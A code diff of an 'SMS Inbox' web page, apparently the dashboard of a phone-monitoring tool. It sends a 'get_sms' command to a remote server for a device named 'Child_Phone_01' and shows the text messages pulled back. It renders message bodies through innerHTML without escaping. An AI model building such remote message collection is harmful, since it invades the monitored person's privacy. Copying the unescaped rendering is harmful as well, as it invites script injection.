@@ -13,120 +13,65 @@
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
             --accent: #4caf50;
-            --accent-glow: rgba(76, 175, 80, 0.3);
         }
 
         body {
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 20px;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 20px;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
+            display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%;
-            max-width: 600px;
+            width: 100%; max-width: 600px;
             background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px;
-            padding: 25px; /* Thoda padding badhaya */
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            border-radius: 30px; padding: 25px;
             border: 1px solid var(--glass-border);
-            height: fit-content;
         }
 
-        /* HEADER SECTION */
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px; /* Gap badhaya */
-            padding-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 30px; padding-bottom: 15px;
             border-bottom: 1px solid var(--glass-border);
         }
 
         .back-btn {
-            text-decoration: none;
-            color: var(--text-main);
-            font-size: 1.2rem;
-            background: var(--glass-bg);
-            padding: 10px 15px;
-            border-radius: 50%;
-            transition: 0.3s;
-            border: 1px solid var(--glass-border);
+            text-decoration: none; color: var(--text-main);
+            background: var(--glass-bg); padding: 10px 15px;
+            border-radius: 50%; border: 1px solid var(--glass-border);
         }
-        .back-btn:hover { background: var(--accent); border-color: var(--accent); }
 
         .title { font-size: 1.5rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
         .title i { color: var(--accent); }
 
-        /* MESSAGE LIST */
-        .sms-list {
-            display: flex;
-            flex-direction: column;
-            gap: 20px; /* Card ke beech ka gap badhaya */
+        .refresh-btn {
+            background: var(--accent); color: white; border: none;
+            padding: 8px 15px; border-radius: 20px; cursor: pointer;
+            font-size: 0.8rem; font-weight: bold;
         }
+
+        .sms-list { display: flex; flex-direction: column; gap: 15px; }
 
         .sms-card {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 18px; /* Thoda aur round kiya */
-            padding: 20px; /* ✅ Andar ka gap badhaya */
-            transition: transform 0.2s;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            border-radius: 18px; padding: 15px; transition: 0.2s;
         }
 
-        .sms-card:hover {
-            transform: translateY(-3px);
-            border-color: var(--accent);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-        }
+        .sender { font-weight: bold; color: var(--accent); font-size: 1rem; }
+        .date { font-size: 0.75rem; color: var(--text-muted); float: right; }
 
-        /* Sender Info */
-        .sms-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            padding-bottom: 8px;
-            margin-bottom: 5px;
-        }
-        .sender {
-            font-weight: bold;
-            color: var(--accent);
-            font-size: 1.1rem; /* Naam thoda bada kiya */
-        }
-        .date {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-        }
-
-        /* Message Body - ✅ MAIN CHANGES YAHAN HAIN */
         .message-body {
-            font-size: 1rem;
-            color: #e0e0e0;
-            line-height: 1.6; /* Lines ke beech space badhaya */
-            background: rgba(0,0,0,0.3);
-            padding: 15px; /* Text ke charo taraf space */
-            border-radius: 12px;
-            min-height: 60px; /* ✅ Kam se kam itni height rahegi */
+            font-size: 0.95rem; color: #e0e0e0; line-height: 1.5;
+            background: rgba(0,0,0,0.3); padding: 12px;
+            border-radius: 12px; margin-top: 10px;
+            word-wrap: break-word;
         }
 
-        .empty-state {
-            text-align: center;
-            padding: 60px;
-            color: var(--text-muted);
-        }
-        .empty-state i { font-size: 3.5rem; margin-bottom: 15px; opacity: 0.5; }
-
+        .empty-state { text-align: center; padding: 60px; color: var(--text-muted); }
+        .empty-state i { font-size: 3rem; margin-bottom: 15px; opacity: 0.5; }
     </style>
 </head>
 <body>
@@ -135,7 +80,7 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
             <div class="title"><i class="fa-solid fa-comments"></i> SMS Inbox</div>
-            <div style="width: 40px;"></div>
+            <button class="refresh-btn" onclick="fetchSMS()"><i class="fa-solid fa-sync"></i> REFRESH</button>
         </div>
 
         <div id="sms-list" class="sms-list">
@@ -147,54 +92,60 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            fetchSMS();
-        });
+        // ⚠️ AAPKA RENDER URL
+        const RENDER_URL = "https://child-v9no.onrender.com";
+        const DEVICE_ID = "Child_Phone_01";
 
-        function fetchSMS() {
-            const deviceId = "Child_Phone_01"; 
+        async function fetchSMS() {
+            const listContainer = document.getElementById("sms-list");
+            
+            try {
+                // 1. Pehle Command bhejo taaki phone naye SMS upload kare
+                await fetch(`${RENDER_URL}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'get_sms' })
+                });
 
-            fetch(`/api/sms/${deviceId}`)
-                .then(response => response.json())
-                .then(data => {
-                    const listContainer = document.getElementById("sms-list");
+                // 2. Thoda wait karo (3 sec) taaki phone data bhej de, fir fetch karo
+                setTimeout(async () => {
+                    const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/sms`);
+                    const data = await response.json();
+
                     listContainer.innerHTML = ""; 
 
-                    if (data.length === 0) {
+                    if (!data || data.length === 0) {
                         listContainer.innerHTML = `
                             <div class="empty-state">
                                 <i class="fa-regular fa-envelope-open"></i>
-                                <p>No SMS Found</p>
+                                <p>No SMS Found. Click Refresh and wait 5 seconds.</p>
                             </div>`;
                         return;
                     }
 
+                    // Data ko table/cards mein dikhao
                     data.forEach(sms => {
                         const smsCard = document.createElement("div");
                         smsCard.className = "sms-card";
-                        
                         smsCard.innerHTML = `
                             <div class="sms-header">
                                 <span class="sender"><i class="fa-solid fa-user"></i> ${sms.address}</span>
                                 <span class="date">${sms.date}</span>
                             </div>
-                            <div class="message-body">
-                                ${sms.body}
-                            </div>
+                            <div class="message-body">${sms.body}</div>
                         `;
                         listContainer.appendChild(smsCard);
                     });
-                })
-                .catch(err => {
-                    console.error("Error:", err);
-                    document.getElementById("sms-list").innerHTML = `
-                        <div class="empty-state" style="color: #ff4444;">
-                            <i class="fa-solid fa-circle-exclamation"></i>
-                            <p>Failed to load SMS</p>
-                        </div>`;
-                });
-        }
-    </script>
+                }, 3000);
 
+            } catch (err) {
+                console.error("Error:", err);
+                listContainer.innerHTML = `<div class="empty-state" style="color:#ff4444;"><p>Server Connection Error</p></div>`;
+            }
+        }
+
+        // Page load hone par apne aap chalega
+        document.addEventListener("DOMContentLoaded", fetchSMS);
+    </script>
 </body>
 </html>
